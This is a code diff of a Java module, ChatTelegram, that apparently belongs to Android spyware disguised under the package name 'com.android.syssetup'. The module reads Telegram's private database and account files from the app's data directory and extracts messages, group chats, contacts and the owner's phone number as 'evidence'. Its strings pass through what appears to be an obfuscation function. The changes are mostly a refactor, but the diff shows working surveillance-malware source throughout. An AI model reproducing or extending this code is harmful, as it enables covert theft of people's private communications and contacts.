@@ -4,6 +4,7 @@ import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabaseCorruptException;
 import android.util.Base64;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.db.GenericSqliteHelper;
 import com.android.syssetup.db.RecordHashPairVisitor;
@@ -12,7 +13,6 @@ import com.android.syssetup.file.Path;
 import com.android.syssetup.module.ModuleAddressBook;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
 
 import org.apache.http.util.EncodingUtils;
 import org.w3c.dom.Document;
@@ -37,56 +37,37 @@ import javax.xml.parsers.DocumentBuilderFactory;
 import javax.xml.parsers.ParserConfigurationException;
 
 public class ChatTelegram extends SubModuleChat {
-	public class TelegramConversation {
-
-		protected Account account;
-		protected long uid;
-		protected String name;
-
-		protected List<Integer> participants = new ArrayList<Integer>();
-		protected String title;
-
-	}
-
-	public class Account {
-
-		public int id;
-		public String name;
-		public String last_name;
-
-		public String getName() {
-			return (name + " " + last_name).trim().toLowerCase();
-		}
-	}
-
 	private static final String TAG = "ChatTelegram";
-
 	private static final int PROGRAM = 0x0e; // anche per addressbook
-
 	String pObserving = M.e("org.telegram.messenger");
 	String dbFile = M.e("/data/data/org.telegram.messenger/files/cache4.db");
 	String dbAccountFile = M.e("/data/data/org.telegram.messenger/shared_prefs/userconfing.xml");
-
-	private Date lastTimestamp;
-
-	private long lastTelegram;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
-
+	private Date lastTimestamp;
+	private long lastTelegram;
 	private Account account;
-
-	//private GenericSqliteHelper helper;
-
 	private boolean firstTime = true;
-
 	private boolean started;
 
-	private boolean old_format_chat=true;
-	// private ByteBuffer in;
+	//private GenericSqliteHelper helper;
+	private boolean old_format_chat = true;
+
+	public static int truncatedEquals(byte[] buffer, int start, byte[] pattern, int offset) {
+
+		int upperBound = Math.min(buffer.length - start, pattern.length - offset);
+		for (int i = 0; i < upperBound; i++) {
+			if (buffer[i + start] != pattern[i + (offset)]) {
+				return i;
+			}
+		}
+		return upperBound;
+	}
 
 	@Override
 	public int getProgramId() {
 		return PROGRAM;
 	}
+	// private ByteBuffer in;
 
 	@Override
 	String getObservingProgram() {
@@ -216,17 +197,6 @@ public class ChatTelegram extends SubModuleChat {
 
 	}
 
-	public static int truncatedEquals(byte[] buffer, int start, byte[] pattern, int offset) {
-
-		int upperBound = Math.min(buffer.length - start, pattern.length - offset);
-		for (int i = 0; i < upperBound; i++) {
-			if (buffer[i + start] != pattern[i + (offset)]) {
-				return i;
-			}
-		}
-		return upperBound;
-	}
-
 	private synchronized GenericSqliteHelper openCopy(String dbFile) {
 		byte[] buf = new byte[1024 * 20];
 
@@ -311,14 +281,15 @@ public class ChatTelegram extends SubModuleChat {
 		return helper;
 	}
 
-	private String fixThreeSemicolons(String name){
-		if(name!=null){
+	private String fixThreeSemicolons(String name) {
+		if (name != null) {
 			if (name.endsWith(M.e(";;;"))) {
 				name = name.substring(0, name.length() - 3);
 			}
 		}
 		return name;
 	}
+
 	private Account readAddressContacts(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
 
 		account = readMyPhoneNumber(dbAccountFile);
@@ -329,11 +300,11 @@ public class ChatTelegram extends SubModuleChat {
 
 				@Override
 				public long cursor(Cursor cursor) {
-					int uid =  cursor.getInt(0);
+					int uid = cursor.getInt(0);
 					String name = cursor.getString(1).trim();
-					name= fixThreeSemicolons(name);
+					name = fixThreeSemicolons(name);
 					String phone = cursor.getString(2).trim();
-					Contact contact = new Contact(""+uid, name, name, phone);
+					Contact contact = new Contact("" + uid, name, name, phone);
 					ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.TELEGRAM, contact);
 					return uid;
 				}
@@ -344,6 +315,7 @@ public class ChatTelegram extends SubModuleChat {
 		}
 		return account;
 	}
+
 	private Account readAddressContacts_old(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
 		account = readMyPhoneNumber(dbAccountFile);
 		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.TELEGRAM, account.getName());
@@ -612,9 +584,10 @@ public class ChatTelegram extends SubModuleChat {
 
 		return conversations;
 	}
+
 	private ArrayList<String> getContentFromBlob(byte[] data) {
-	// take long run decision on content!=null isn't safe we check it again avery time
-		old_format_chat=true;
+		// take long run decision on content!=null isn't safe we check it again avery time
+		old_format_chat = true;
 		ByteBuffer in = MappedByteBuffer.wrap(data);
 			/* 0xbc799737 0x37,0x97, 0x79, 0xbc
 			44 byte telegram 2.0.5 NON funziona
@@ -656,7 +629,7 @@ public class ChatTelegram extends SubModuleChat {
 		to_id = readInt32(in);
 		to_id2 = readInt32(in);
 		out = readBool(in);
-		int unread_bool_pos=in.position();
+		int unread_bool_pos = in.position();
 		unread = readBool(in);
 		m_date = readInt32(in);
 		content = readString(in);
@@ -673,7 +646,7 @@ public class ChatTelegram extends SubModuleChat {
 			m_date = readInt32(in);
 			content = readString(in);
 			if (content != null) {
-			// take long run decision on content!=null isn't safe we check it again avery time
+				// take long run decision on content!=null isn't safe we check it again avery time
 				old_format_chat = false;
 				res.remove(3);
 				res.add(3, Integer.toString(to_id));
@@ -688,117 +661,6 @@ public class ChatTelegram extends SubModuleChat {
 			return res;
 		} else {
 			return null;
-		}
-	}
-	public class MessageGroupVisitor extends RecordVisitor {
-
-		private ArrayList<MessageChat> messages;
-		private ChatGroups groups;
-		private RecordHashPairVisitor users;
-
-		public MessageGroupVisitor(ArrayList<MessageChat> messages, ChatGroups groups, RecordHashPairVisitor users) {
-			this.messages = messages;
-			this.groups = groups;
-			this.users = users;
-		}
-
-		@Override
-		public long cursor(Cursor cursor) {
-			long created_time = cursor.getLong(0);
-			Date date = new Date(created_time * 1000);
-
-			byte[] data = cursor.getBlob(1);
-			boolean incoming = cursor.getInt(2) == 0;
-			// localtime or gmt? should be converted to gmt
-
-			int uid = cursor.getInt(3);
-			String sid = Integer.toString(-uid);
-
-			ArrayList<String> parsedBlob = getContentFromBlob(data);
-
-			if (parsedBlob!=null && parsedBlob.size()>=5 && !StringUtils.isEmpty(parsedBlob.get(0))) {
-				String to, from;
-				if (incoming) {
-					from = users.get(parsedBlob.get(3));
-					to = groups.getGroupToName(from, sid);
-				} else {
-					to = groups.getGroupToName(account.getName(), sid);
-					from = account.getName();
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
-							from, to, parsedBlob.get(0));
-				}
-				if(old_format_chat == false){
-				/* user names in users table end iwith three ';'
-				 * so in case the version of the db is the new one
-				 * we strip them to have a good looking evicence
-				**/
-					if (from.endsWith(M.e(";;;"))) {
-						from = from.substring(0, from.length() - 3);
-					}
-					if (to.endsWith(M.e(";;;"))) {
-						to = to.substring(0, to.length() - 3);
-					}
-					to = to.replaceAll(M.e(";;;,"),",");
-					from = from.replaceAll(M.e(";;;,"),",");
-				}
-				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
-				messages.add(message);
-			}
-			return created_time;
-		}
-	}
-
-	class MessageRecordVisitor extends RecordVisitor {
-		private ArrayList<MessageChat> messages;
-
-		public MessageRecordVisitor(ArrayList<MessageChat> messages) {
-			this.messages = messages;
-		}
-
-		@Override
-		public long cursor(Cursor cursor) {
-			long created_time = cursor.getLong(0);
-			Date date = new Date(created_time * 1000);
-
-			byte[] data = cursor.getBlob(1);
-			boolean incoming = cursor.getInt(2) == 0;
-			// localtime or gmt? should be converted to gmt
-			String name = cursor.getString(3);
-
-			String to, from;
-			if (incoming) {
-				to = account.getName();
-				from = name;
-			} else {
-				to = name;
-				from = account.getName();
-			}
-			ArrayList<String> parsedBlob = getContentFromBlob(data);
-			if (parsedBlob!=null && parsedBlob.size()>=3 && !StringUtils.isEmpty(parsedBlob.get(0))) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
-							from, to, parsedBlob.get(0));
-				}
-				if(old_format_chat == false) {
-								/* user names in users table end iwith three ';'
-				 * so in case the version of the db is the new one
-				 * we strip them to have a good looking evicence 
-				**/
-					if (from.endsWith(M.e(";;;"))) {
-						from = from.substring(0, from.length() - 3);
-					}
-					if (to.endsWith(M.e(";;;"))) {
-						to = to.substring(0, to.length() - 3);
-					}
-				}
-				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
-				messages.add(message);
-				}
-
-			return created_time;
 		}
 	}
 
@@ -845,7 +707,7 @@ public class ChatTelegram extends SubModuleChat {
 			/*
 			 * long i = 0; for (int j = 0; j < 8; j++) { i |= ((long) in.get()
 			 * << (j * 8)); }
-			 * 
+			 *
 			 * return i;
 			 */
 		} catch (Exception x) {
@@ -867,6 +729,140 @@ public class ChatTelegram extends SubModuleChat {
 		}
 
 		return false;
+	}
+
+	public class TelegramConversation {
+
+		protected Account account;
+		protected long uid;
+		protected String name;
+
+		protected List<Integer> participants = new ArrayList<Integer>();
+		protected String title;
+
+	}
+
+	public class Account {
+
+		public int id;
+		public String name;
+		public String last_name;
+
+		public String getName() {
+			return (name + " " + last_name).trim().toLowerCase();
+		}
+	}
+
+	public class MessageGroupVisitor extends RecordVisitor {
+
+		private ArrayList<MessageChat> messages;
+		private ChatGroups groups;
+		private RecordHashPairVisitor users;
+
+		public MessageGroupVisitor(ArrayList<MessageChat> messages, ChatGroups groups, RecordHashPairVisitor users) {
+			this.messages = messages;
+			this.groups = groups;
+			this.users = users;
+		}
+
+		@Override
+		public long cursor(Cursor cursor) {
+			long created_time = cursor.getLong(0);
+			Date date = new Date(created_time * 1000);
+
+			byte[] data = cursor.getBlob(1);
+			boolean incoming = cursor.getInt(2) == 0;
+			// localtime or gmt? should be converted to gmt
+
+			int uid = cursor.getInt(3);
+			String sid = Integer.toString(-uid);
+
+			ArrayList<String> parsedBlob = getContentFromBlob(data);
+
+			if (parsedBlob != null && parsedBlob.size() >= 5 && !StringUtils.isEmpty(parsedBlob.get(0))) {
+				String to, from;
+				if (incoming) {
+					from = users.get(parsedBlob.get(3));
+					to = groups.getGroupToName(from, sid);
+				} else {
+					to = groups.getGroupToName(account.getName(), sid);
+					from = account.getName();
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
+							from, to, parsedBlob.get(0));
+				}
+				if (old_format_chat == false) {
+				/* user names in users table end iwith three ';'
+				 * so in case the version of the db is the new one
+				 * we strip them to have a good looking evicence
+				**/
+					if (from.endsWith(M.e(";;;"))) {
+						from = from.substring(0, from.length() - 3);
+					}
+					if (to.endsWith(M.e(";;;"))) {
+						to = to.substring(0, to.length() - 3);
+					}
+					to = to.replaceAll(M.e(";;;,"), ",");
+					from = from.replaceAll(M.e(";;;,"), ",");
+				}
+				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
+				messages.add(message);
+			}
+			return created_time;
+		}
+	}
+
+	class MessageRecordVisitor extends RecordVisitor {
+		private ArrayList<MessageChat> messages;
+
+		public MessageRecordVisitor(ArrayList<MessageChat> messages) {
+			this.messages = messages;
+		}
+
+		@Override
+		public long cursor(Cursor cursor) {
+			long created_time = cursor.getLong(0);
+			Date date = new Date(created_time * 1000);
+
+			byte[] data = cursor.getBlob(1);
+			boolean incoming = cursor.getInt(2) == 0;
+			// localtime or gmt? should be converted to gmt
+			String name = cursor.getString(3);
+
+			String to, from;
+			if (incoming) {
+				to = account.getName();
+				from = name;
+			} else {
+				to = name;
+				from = account.getName();
+			}
+			ArrayList<String> parsedBlob = getContentFromBlob(data);
+			if (parsedBlob != null && parsedBlob.size() >= 3 && !StringUtils.isEmpty(parsedBlob.get(0))) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
+							from, to, parsedBlob.get(0));
+				}
+				if (old_format_chat == false) {
+								/* user names in users table end iwith three ';'
+				 * so in case the version of the db is the new one
+				 * we strip them to have a good looking evicence
+				**/
+					if (from.endsWith(M.e(";;;"))) {
+						from = from.substring(0, from.length() - 3);
+					}
+					if (to.endsWith(M.e(";;;"))) {
+						to = to.substring(0, to.length() - 3);
+					}
+				}
+				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
+				messages.add(message);
+			}
+
+			return created_time;
+		}
 	}
 
 }
